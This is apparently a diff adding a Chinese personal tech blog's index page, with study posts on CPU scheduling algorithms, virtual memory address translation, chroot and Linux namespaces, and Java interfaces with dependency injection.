+<h2 id="RR（Round-Robin）"><a href="#RR（Round-Robin）" class="headerlink" title="RR（Round Robin）"></a>RR（Round Robin）</h2><p>如果之满足于 Turnaroud Time ,那麽我们的任务应该在 STCF 提出时就结束了。但我们不能只满足于 Turnaroud Time 。</p>
+<p>假想，如果有三个 job，每一 job 都要花 1000s，在第一个 job 完成之前，你得等到 1000s 之后，才能看到第二个 job 开始工作。天！我想要知道自己输进去的式子有没有问题，必须等到 1000s 后，才能看到第一次运行！响应太慢了！</p>
+<p>能想到最简单的办法，就是加快 STCF 的切换过程。比如，A 执行几秒，B 执行几秒，这样不停的切换就好了。这也是 Round Robin 算法的核心。</p>
+<p>不过，如果这样的法，STCF 的关键<strong>最短可完成</strong>就没了，同时，频繁切换进程也会产生很大的花销，切换得越快，花销就越多，这样是否值得？换而言之，我们 STCF 算法依然不是我们想要的，最优的，算法。</p>
+<hr>
+<h2 id="最关键的问题"><a href="#最关键的问题" class="headerlink" title="最关键的问题"></a>最关键的问题</h2><p>我们要找到一个算法，它的 <em>Turnaroud Time</em> 期望最小，同时，还要很快的响应。这才是我们的目标。</p>
+<p>还有，我们还要解决从最开始就设下的，绝对不可以忽视的，上面所有算法的根基条件。破坏这个条件，也意味着，上面的一切算法将会轰然倒塌，那就是：我们无法知道任务的运行时间。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/09/08/%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="ck7h7ugtq0006633x4ogqai4k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-调度算法（一）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/09/02/%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2019-09-01T16:00:00.000Z" itemprop="datePublished">2019-09-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/02/%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89/">调度算法（一）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>当进程虚拟化完成时，会自然遇到一个问题：我们该切换到哪一个进程？</p>
+<p>人类做事情，可以依靠大脑自动完成任务的排序，比如，洗澡时，可以边想其它事边洗，可能洗完了都不知道自己刚才做了什麽。可计算机不一样，计算机很傻，它需要人来帮助它完成这一系列的安排，否则它不知道下一步该做什麽。</p>
+<p>爲什麽是这个进程，而不是那个进程？我们的计算器是依靠什麽来决定进程的切换？</p>
+<p>现在，是时候来好好回答一下这个问题。</p>
+<p>先从最简单的想法开始。</p>
+<h2 id="先进先出队列-FIFO-First-In-Fisrt-Out"><a href="#先进先出队列-FIFO-First-In-Fisrt-Out" class="headerlink" title="先进先出队列 FIFO (First In Fisrt Out)"></a>先进先出队列 FIFO (First In Fisrt Out)</h2><p>假设同一时间里，有多个任务，那麽，谁先到队列就先执行谁，完成后再执行下一个。</p>
+<p>这个想法很像超市排队。实事上，这也是它被叫队列的原因，每一个任务都一样，不管你从哪里来，有什麽身份，都给我乖乖排队。</p>
+<h2 id="最短的先来-SJF-Shortest-Job-First"><a href="#最短的先来-SJF-Shortest-Job-First" class="headerlink" title="最短的先来 SJF (Shortest Job First)"></a>最短的先来 SJF (Shortest Job First)</h2><p>可这有一点问题。虽然在计算机的眼中，这个队列怎麽排，总的运行时长是相同的，不会因爲 A 在 B 前，时间就比 B 在 A 前短。可任务不这麽想。</p>
+<p>还是在超市排队的例子。收营员压根不管谁在前谁在后，他只负责收营，在他眼中，整个队列的时长是一定的。</p>
+<p>但买东西的顾客就不一样了。顾客很在乎从排队开始到结算完的这段时长，因爲他们只看到了自己。每个人排了多久才完成结账的时间完全不同的。如果只有顾客 A 和 B 在排队。A 的东西要 10 分锺算完，B 要 5 分锺。如果 A 在 B 前结算，B 需要 15 分锺完成结账，反过来，B 在 A 前的话，B 只要 5 分锺就完成了。在 B 眼中，后者更高效。</p>
+<p>你可能会说，那麽 A 不也被拖慢了，我们就不管 A 的感受了吗？</p>
+<p>当然要管。爲此，我们应该有一个标准，来考察 B 排在 A 前比排在后，更结省每个客人的时间。</p>
+<p>我们设置一个量，称爲 Turnaroud Time。它用来描述每一个客人从排队到完成结算的时间。比如 A 排在 B 前，那麽对于 B，它的 Turnaroud Time 是 10+5 分锺。反过来排，这个值只有 5。我们可以计算一下两种排法的期望值。</p>
+<p>先是 A 排在 B 前。</p>
+<p>$10+152=12.5\cfrac{10+15}{2} = 12.5 210+15​=12.5$</p>
+<p>然后反过来。</p>
+<p>$$5+152=10\cfrac{5+15}{2} = 10 25+15​=10$$</p>
+<p>两个值并不一样！</p>
+<p>换而言之，两种不同的排法，对期望是有影响的。在尝试一下加入第三个客人 C，它需要 15 分锺才能算完。</p>
+<p>统计一下，不同排序对应的 Turnaroud Time 期望值。</p>
+<table>
+<thead>
+<tr>
+<th>排法</th>
+<th>U(turnaround time)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A B C</td>
+<td>18.333</td>
+</tr>
+<tr>
+<td>A C B</td>
+<td>21.667</td>
+</tr>
+<tr>
+<td>B A C</td>
+<td>16.667</td>
+</tr>
+<tr>
+<td>B C A</td>
+<td>18.333</td>
+</tr>
+<tr>
+<td>C A B</td>
+<td>23.333</td>
+</tr>
+<tr>
+<td>C B A</td>
+<td>21.557</td>
+</tr>
+</tbody></table>
+<p>通过 6 种不同的排列，得到的 Turnaroud Time 值是不同的。最短的，是 B A C 的顺序。</p>
+<p>假设 B 排的是 x 分锺，对应 A 就是 2x 分锺，C 是 3x。</p>
+<p>最短的，B A C 的顺序中，B 花了 x，A 花了 x+2x，C 花了 x+2x+3x</p>
+<p>最长的，C A B 的顺序中，C 花了 3x，A 花了 3x+2x，B 花了 x+2x+3x</p>
+<p>可以发现：最后一个花的时间都是相同中的，不同的是前面的人。因爲第 i+1 人花的时间，总是要加上第 i 人的时间。第 i 人花的时间越少，第 i+1 人花的时间就越少。由此，我们可以得到一个重要的规则。</p>
+<blockquote>
+<p>最前面的任务，时长越短，Turnaroud Time 期望值越小</p>
+</blockquote>
+<p>下面两种排法显然不同</p>
+<p><img src="1567392403118.png" alt=""></p>
+<p><img src="1567392403168.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/09/02/%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ck7h7mt5b0005633xh88pd6nm" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-虚拟内存" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/08/17/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" class="article-date">
+  <time datetime="2019-08-16T16:00:00.000Z" itemprop="datePublished">2019-08-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/17/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/">虚拟内存</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="没有虚拟内存带来的问题"><a href="#没有虚拟内存带来的问题" class="headerlink" title="没有虚拟内存带来的问题"></a>没有虚拟内存带来的问题</h2><p>我们在运行程序时，总希望内存越大越好，这样可以运行的程序也可以越来越多，越来越大。但现实是，这样做是有很多成本的。最简单的成本就是钱。过去，爲了解决这个问题，人们写程序时，会考虑到内存大小，如果自己写的程序大过内存，那麽还要做一些工作，比如：想办法，只加载一部分代码，当有更多的需要时，再加载更多。</p>
+<p>这是一个相当有开创性的想法。这一想法在后来诞生了虚拟内存的伟大概念。（我瞎掰的）</p>
+<h2 id="虚拟内存的基本原理"><a href="#虚拟内存的基本原理" class="headerlink" title="虚拟内存的基本原理"></a>虚拟内存的基本原理</h2><p><img src="1566035265964.png" alt=""></p>
+<p>简单来说，当我们运行一个进程时，计算机并不会把整个程序都加载进内存里，而是放在硬盘上，当有需要时，再将加载需要的那一部分。</p>
+<p>那我们怎麽知道要加载哪一部分？比如说，我的下一条指令是到要变量 B，可是变量 B 没加载进内存，我也不知道它在哪，要怎麽去硬盘里找？</p>
+<p>那好吧，爲了做好映射关係，我们还要在进程运行时，给进程一张表，它负责进行内存和硬盘之间的关係。比如说，变量 B 的内存是 Ox11011，发现这在内存里不存在，那麽我们就去表上找，发现它在对应着内存里的 Ox00100，那麽我们就把内存里的那个 B 给它。</p>
+<p>但如果每一个变量，每个字都做映射，都要到硬盘里找，这实在是太麻类了。更重要的是，对硬盘做一次查询，所消耗的时间太长了，在 CPU 看来，每进行一次，都要花费 10 个月的时间。爲了省时省力，我们把程序分成多个部分，每一部分叫做一个虚拟页。同时，内存里也分成多个页，叫物理页。每一个物理页都可以容纳一个虚拟页。而映射它们的那张表，叫页表。</p>
+<p>现在我们来看看一个实例，虚拟地址是如何转换成物理地址的。</p>
+<p>一般而言，计算机是通过多级页表进行转换的，但爲了简单，这里就讨论只有一张页表的情况。</p>
+<p>现在设有 14 位的虚拟地址，要转换成 12 位的真实地址。其中，页表大小爲 64(2的6次方) B。</p>
+<ol>
+<li><p>通过虚拟地址位数和页大小，我们可以换算得到，共有 21426=256\cfrac{2^{14}}{2^6}=25626214​=256 项。也就是说，要 8 位数才能表示完所有页(VPN)。那麽 14−8=614-8=614−8=6 来表示偏移量(VPO)。</p>
+</li>
+<li><p>由虚拟地址的偏移量，我们可以知道真实地址的偏移量。（两者相等）</p>
+</li>
+</ol>
+<p>比如下面，我们已知虚拟地址爲 00101100100010 （VPN(8) VPO(6)）</p>
+<p>那麽 00101100 爲虚拟页的首地址（页码）。100010 爲虚拟地址的偏移量。</p>
+<p>通过查页表，将 00101100 映射爲真实地址，假设爲 11010011，再加上偏移量 100010 得到真实地址 11010011100010.</p>
+<blockquote>
+<p>00101100100010 =&gt; 11010011100010</p>
+</blockquote>
+<p>到这里，地址转换就完成了！</p>
+<p>如果是多级页表，也只是通过多个 虚拟首地址（页码） 的转换而已。变成 VPN VPN VPN VPN … VPO。</p>
+<h2 id="它带来的好处"><a href="#它带来的好处" class="headerlink" title="它带来的好处"></a>它带来的好处</h2><p>简化链接、简化内存分配（不连续）、进程上的安全（不会干扰到其它进程）</p>
+<p>虚拟内存的出现，给我们带来了意想不到的好处。</p>
+<p>首先，它简化了链接过程。当程序编译完成时，程序里的每一个变量，每一个函数，还只是对应一个相对的地址，想要执行，还得有一个动态链接过程。由于虚拟页的存在，生成的可执行文件的地址可以独立于物理内存，这样设计链接器时，就简单得多。</p>
+<p>另外，因爲虚拟页与物理页之间是靠页表进行映射的，因此，一个进程的不周数据在物理内存里，可以不连续。毕竟查表就能知道它们的位置了，连不连续已经不重要了。于是，这样内存可以更动态，更轻鬆的进行分配。</p>
+<p>最后，可以虚拟化进程了。进程因爲页表的存在，不会存在相互干扰了。两个进程因爲页表与页表之间不同，映射到的地方不同，那怕虚拟地址相同，物理内存上也不会相同，它们之间彷彿有一道牆，阻止它们相互侵犯。</p>
+<h2 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h2><p>没错，地址也可以虚拟化。还有多少东西可以虚拟化呢？真的好期待啊。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/17/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" data-id="ck7h7k1df0004633x0a98blt0" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-对于虚拟化的执着" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/08/11/%E5%AF%B9%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E6%89%A7%E7%9D%80/" class="article-date">
+  <time datetime="2019-08-10T16:00:00.000Z" itemprop="datePublished">2019-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/11/%E5%AF%B9%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E6%89%A7%E7%9D%80/">对于虚拟化的执着</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>我第一次了解到虚拟化，是在用 VM Ware 时。</p>
+<p>虚拟化给人的感觉真的很棒。将真实与实验分割开来，互不影响，即使出了问题，删掉再开就是了。在虚拟机里发生的事情，丝毫不影响主机，这种感觉真的有种玩游戏/做梦的错觉。但总觉得 VM 还是太大了，开起来之后，整个电脑都卡成 PPT 了。</p>
+<p>后来用 Python 做一些小服务时，发现 Python3 自带虚拟化。通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv vitual_name</span><br></pre></td></tr></table></figure>
+
+<p>就可以建立一个小的虚拟环境。在这个小环境里，新装的所有第三方库，都不会影响到主机现有的库。这样一来，python 依敕也就可以随便玩了。如果依敕出了问题，比如版本号不对，新的版本不兼容旧的代码等，也不至于所有的脚本都影响到。删了就好了。</p>
+<p>再后来发现了 Docker。Docker 比起虚拟机，轻量得多。在上面建立好服务后，便可以上传。到了另一台服务器上，下载便可以使用，不用再装各种依赖，解决各种各样的麻烦。就如它的名字一样，依赖被关在 Docker 里。当需要时，打开 docker，所有的东西都在里面。这在开发时简直是利器啊！我只要在本地做好一个版本，工作就完全结束了，剩下服务器端只要下载，运行，就OK了。</p>
+<p>同时，我也要好奇。虚拟化那麽厉害的东西，究竟是怎麽完成的？</p>
+<p>仔细想想，虚拟化并不是什麽新奇的东西。我们的每一个进程，从某种角度上看，就是虚拟化的产物。</p>
+<p>在早期计算机的发展中，内存是很稀缺的一种东西。比如有些电脑就 4k bytes。这种情况下，光是加载程序文本就很困难。于是虚拟内存、页表等孕育而生。它们让每一个进程觉得，自己独佔了机器，随意使用计算机里的内存。通过 CPU 调度，让每一个进程都有一定的活动时间。从人的角度上看，有多个进程在运行，而进程本身，它们只看到了自己。</p>
+<p>从这个角度上看，每一个进程都与主机上的其它程序无关，它们彼此隔开，就好像一台台虚拟机。</p>
+<p>不过，改变了世界的 Linux 给我们带来了更美妙的东西。</p>
+<p>在 Linux 里，有趣的命令很多，其中的一条就和我今天想讨论的东西有关。它就是 chroot。</p>
+<p>chroot 是一个可以欺骗命令的命令。它可以让任何命令，认爲当前的目录就是根目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chroot /path/to/new/root command</span></span><br></pre></td></tr></table></figure>
+
+<p>Linux 中，绝大部分命令、程序，都以根目录 「/」 爲中心。如果能欺骗命令，让其认定新的根目录，不就好像实现了虚拟化了吗？</p>
+<p>比如下面这一个有趣的实验。它建立了一个只能使用 ls 命令的监狱(jali)。方法也很简单，只将跟 ls 有关的依赖放在新目录里，再 chroot bash 命令。</p>
+<p><img src="1565527230467.gif" alt="建立监狱的过程"></p>
+<p>但这并不够。chroot 只能使用在文件系统上。对于网络，IO等，它无法限制。</p>
+<p>于是，内核 3.8 中，诞生的 namespace（命名空间）打破了这一限制。namespace 也是一种虚拟化方式，但它可以做到更多。它支持以下几种 namespace。</p>
+<ul>
+<li>uts_namespace</li>
+<li>ipc_namespace</li>
+<li>mnt_namespace</li>
+<li>pid_namespace</li>
+<li>user_namespace</li>
+<li>net</li>
+</ul>
+<p>在进程的虚拟化上，使用 fork 或 clone 就可以创建一个新的命名空间。进程与命名空间之间，借助 nsproxy 进行代理。</p>
+<p>从 nsproxy 的结构上，也可以看到上面的几种命名空间。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct nsproxy&#123;</span><br><span class="line">    atomic_t count;</span><br><span class="line">    struct uts_namespace *uts_ns;</span><br><span class="line">    struct ipc_namespace *ipc_ns;</span><br><span class="line">    struct mnt_namespace *mnt_ns;</span><br><span class="line">    struct pid_namespace *pid_ns;</span><br><span class="line">    struct net *net_ns;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除开第一行，剩下都是命名空间的结构。</p>
+<p>命名空间的出现，才有了如今的 docker。</p>
+<p>对于虚拟化越发的着迷，我对计算机就越发的执着。</p>
+<p>想来想去，之所以会着迷于虚拟化，可能是因爲从小搞坏了不少电脑的原故吧？</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/11/%E5%AF%B9%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E6%89%A7%E7%9D%80/" data-id="ck7h7gcp50003633x4f3ehvat" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-面向接口" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/08/04/%E9%9D%A2%E5%90%91%E6%8E%A5%E5%8F%A3/" class="article-date">
+  <time datetime="2019-08-03T16:00:00.000Z" itemprop="datePublished">2019-08-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/08/04/%E9%9D%A2%E5%90%91%E6%8E%A5%E5%8F%A3/">面向接口</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在实习了一个星期之后，对接口有了更深入的思考。</p>
+<p>写代码对我而言只是一种兴趣。由于没有任何人对我做出任何要求，很多时候，我只要求将东西写出来就可以了。每当学到新的东西，就一股脑地加入其中，久而久之，我再翻看过去写的代码，只觉得冗长且难看。好在，这些东西大多数时候只有我一个人看，写成什么样都无所谓了。</p>
+<p>但现在马上毕业，也不能再任性下去。我得学会和他人合作，共同写出每一个人都能理解的东西。重要的是，当其中一个人离开时，新加入的人可以理解，并很快加入其中。</p>
+<p>当然，站在老板的角度上，这样就可以压榨更多员工了。但站在更大的角度上看，我们所做出来的东西，如果能被世界的人理解，并使用，共同创造出一个东西。这一个东西，不会因为时间，空间，乃至人的变化，而变化，它可以被每一个人所继承，所共有，并传递下去，实现永恒，这不是很棒吗？</p>
+<p>过去我一直一个人在战斗，虽然也会用大佬做的库，但它们只是我实现目标的工具，并非过程。而这一次，要实现的就是工具。简单来讲，我的职责，从调用者，变成了服务者。既然职责发生了转变，那么思维也要跟着发生转变。</p>
+<p>于是，我开始理解，过去无法理解的事情。</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>JAVA 的面向对象中，有一个叫做接口（Interface）的东西。接口很像一个类，又与类不同，比如，接口禁止申明函数的过程。就比如下面的写法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">interface mouth&#123;</span><br><span class="line">    public void sayHello();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;下面的写法是禁止的</span><br><span class="line"></span><br><span class="line">interface mouth&#123;</span><br><span class="line">    public void sayHello()&#123;</span><br><span class="line">      return &quot;Hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那函数没有具体的功能，那它就没用了吗？</p>
+<p>不，是有用的，它可以被其它类实现 (implements)，然后赋予这个函数功能。比如下面的写法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Chinese implements mouth&#123;</span><br><span class="line">    public void sayHello()&#123;</span><br><span class="line">        return &quot;你好！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Japenese implements mouth&#123;</span><br><span class="line">    public void sayHello()&#123;</span><br><span class="line">        return &quot;konijiwa！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很奇怪吧。明明在最开始就可以做到的事情，为什么要在后面用另一个类实现？ 明明可以用继承的方式，为什么要多加一个接口的概念？</p>
+<h2 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h2><p>在现实生活中，充斥着大量的约定。比如说，去买早点，大家都约定好，你给我钱，我给你吃的；手机买回来，充电插头一定是双脚的；无论在哪买的 USB，都能插上电脑，传输数据；无论什么城市，过马路时，红灯都得停下来。。。</p>
+<p>小到微观世界，大到整个宇宙，大大小小都围绕着某种约定，做着正确的事。一旦违背了约定，定会遭到惩罚。</p>
+<p>仔细思考一下约定这种行为，它必定是由多个人共同承担起。假如世界上只有一个人，他做什么事都不会违背约定。</p>
+<p>接口其实也是一种约定。用更准确的说法，便是「协议」(protocol)。</p>
+<p>嘴巴有个功能就是说话，至于怎么说，说什么，每个人都有不同的实现方式。中国人有中国人的说法，日本人有日本人的说法，但它们都要满足，会说这个功能（这里只是为了方便解释，就不要问我哑巴怎么办）。</p>
+<p>在多人合作时，这样就很方便。只要有接口就好了，具体怎么做就看你的了。但无论你怎么做，都不能违返这个接口定下的规则。</p>
+<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>当我们尝试将接口变成核心时，就会发现，很多事情变得简单了。</p>
+<p>首先，我不再关心调用者实现，调用者也不再关心我的实现。比如有调用者用了我的类做了点事情。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class user&#123;</span><br><span class="line">    public function do(Human H)&#123;</span><br><span class="line">        H.sayHello();</span><br><span class="line">        H.sayGoodbye();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 H，调用者可以放 Chinese 实例，可以放 Japenese 实例，可以放 American 实例，都无所谓。只要他传进来的东西满足</p>
+<ul>
+<li>是 Human 类</li>
+<li>实现了统一的接口</li>
+</ul>
+<p>那就没任何问题。</p>
+<p>与之而来的是，我这边的任务也会很轻松。我定义了接口之后，就可以在满足接口的定义下，任意实现功能。</p>
+<p>调用者和服务者之间的联系变弱了，但也更强硬了，我们不一定需要你，但我们都必须遵守约定，遵守接口。</p>
+<h2 id="云服务"><a href="#云服务" class="headerlink" title="云服务"></a>云服务</h2><p>现在出现的大量的云服务，也是建立在这个基础之上。如果有兴趣，可以上腾讯云或者阿里云的网站上看看。</p>
+<p><img src="1564906395080.png" alt="腾讯云服务"></p>
+<p>如果想要人脸识别的功能，你大可不必亲自实现，只要满足了接口的要求，花点小钱，就可以实现。</p>
+<h2 id="更深一点的内容"><a href="#更深一点的内容" class="headerlink" title="更深一点的内容"></a>更深一点的内容</h2><p>如果只是想了解接口，上面的东西已经足够了。但如果想要来点更深的东西，就继续往下看吧。</p>
+<h3 id="依赖注入-Dependency-Injection"><a href="#依赖注入-Dependency-Injection" class="headerlink" title="依赖注入(Dependency Injection)"></a>依赖注入(Dependency Injection)</h3><p>依賴注入是我在看 Spring 框架时，遇到的第一个词。</p>
+<p>之所以用接口，是因为我们在编程时，不得不面对一个问题：依赖。</p>
+<p>在实际工作中，经常就会写出这样的东西。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public BMW_wheel&#123;</span><br><span class="line">  public void go&#123;</span><br><span class="line">      System.out.print(&quot;BMW&#39;s wheels working!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public BMW_Car &#123;</span><br><span class="line">  Wheel BMW_Wheel;</span><br><span class="line">  public BWM_Car()&#123;</span><br><span class="line">    BMW_Wheel &#x3D; new BMW_Wheel();</span><br><span class="line">  &#125;</span><br><span class="line">  public void BMM_Run()&#123;</span><br><span class="line">     BMW_Wheel.go();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Person&#123;</span><br><span class="line">  public void drive()&#123;</span><br><span class="line">     BMW_Car Car &#x3D; new BMW_Car();</span><br><span class="line">     Car.BMW_Run();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码是没任何问题，事实上，也是可以这么写的。但问题在于，假如我做出的这个东西不是我一个人用，而是分享给很多人用，有的人不想用宝马的轮子，而是想用奔驰的轮子，有的人想改用自己家造的轮子。那么每个人都要读懂上面我写的东西，改得 Car 的实例化过程，最后才能正常的用自己设定的轮子跑起来。如果，假设，在 BMW_Car 又被另一个 Person 类依赖，Person 类被 Company 依赖，那么改动一小点，都会引发滚雪球式的灾难。</p>
+<p>而解决这一个问题的思想，就是改变我们的想法，将依赖关系倒转过来。</p>
+<p>如果我在写上面的类时，留有一些空隙，问题就会变得很简单。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface Car&#123;</span><br><span class="line">  public void Run(Wheel wheel);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时，轮子类也做个接口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface Wheel&#123;</span><br><span class="line">  public void go();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后，实现车类。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public BMW_Car implement Car&#123;</span><br><span class="line">  Wheel wheel;</span><br><span class="line">  public void BMW_Car(Wheel wheel)&#123;</span><br><span class="line">      this.wheel &#x3D; wheel;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public void Run()&#123;</span><br><span class="line">    this.wheel.go();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Tesla implements Car&#123;</span><br><span class="line">  Wheel wheel;</span><br><span class="line"></span><br><span class="line">  public void Tesla(Wheel wheel)&#123;</span><br><span class="line">    this.wheel &#x3D; wheel;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void Run()&#123;</span><br><span class="line">    this.wheel.go();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过接口，轮子类和车轮之间的耦合度降低了。在上面，我不再关心这辆宝马车用的是什么轮子。我要的只是轮子，你只要满足轮子接口的东西就可以了。</p>
+<p>你完全可以写成下面的代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Person&#123;</span><br><span class="line">  public void driving()&#123;</span><br><span class="line">      Car BMW_Car &#x3D; new BMW_Car()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（为什么不用万能的 Python 来写这段代码？那是因为 Python 是鸭子类型啊，不需要接口）</p>
+<h3 id="REST-风格"><a href="#REST-风格" class="headerlink" title="REST 风格"></a>REST 风格</h3><p>解决依赖的方法除了在代码上，我们还可以通过使用更成熟的思想。</p>
+<p>在 2000 年，Fielding 大佬的博士论文的第五章，介绍了一种架构风格，叫作 REST（Representation state transfer）。这种风格，如今应用于各大应用中。</p>
